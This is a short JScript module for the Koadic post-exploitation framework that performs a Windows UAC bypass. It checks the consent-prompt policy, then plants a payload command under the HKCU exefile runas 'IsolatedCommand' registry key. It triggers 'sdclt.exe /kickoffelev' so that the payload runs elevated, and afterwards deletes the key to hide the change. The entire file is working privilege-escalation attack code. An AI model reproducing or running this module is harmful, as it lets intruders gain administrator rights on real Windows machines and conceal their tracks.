try
{
    var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var consentval = Koadic.registry.read(Koadic.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", Koadic.registry.DWORD).uValue;
    if (consentval == 2)
    {
        var e = Error('Consent value is too high!');
        throw e;
    }
    var path = "Software\\Classes\\exefile\\shell\\runas\\command";

    var cmd = Koadic.file.getPath("%COMSPEC%");
    Koadic.registry.write(Koadic.registry.HKCU, path, "IsolatedCommand", cmd + " /c ~PAYLOAD_DATA~", Koadic.registry.STRING);

    Koadic.shell.run("sdclt.exe /kickoffelev", true);

    Koadic.work.report("Completed");

    var now = new Date().getTime();
    while (new Date().getTime() < now + 10000);

    if (Koadic.registry.destroy(Koadic.registry.HKCU, path, "IsolatedCommand") != 0)
    {
        Koadic.shell.run("reg delete HKCU\\"+path+" /v IsolatedCommand /f", true);
    }
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
